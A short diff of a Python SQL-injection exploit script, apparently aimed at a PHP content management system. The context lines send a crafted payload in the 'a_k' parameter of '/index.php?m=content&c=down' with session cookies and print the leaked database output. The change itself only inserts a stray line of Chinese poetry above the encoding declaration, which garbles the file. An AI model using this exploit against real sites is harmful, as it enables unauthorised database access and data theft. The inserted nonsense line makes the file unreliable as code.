@@ -1,3 +1,5 @@
+
+鹅鹅鹅曲项向天歌
 # -*- coding: utf-8 -*-
 import requests
 import sys
@@ -58,3 +60,4 @@ print('[+] Get SQLi Payload : ' + sqli_payload)
 setp3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
 html = requests.get(setp3, cookies=cookies).text
 print('[+] Get SQLi Output : ' + html.split('luan$')[1])
+
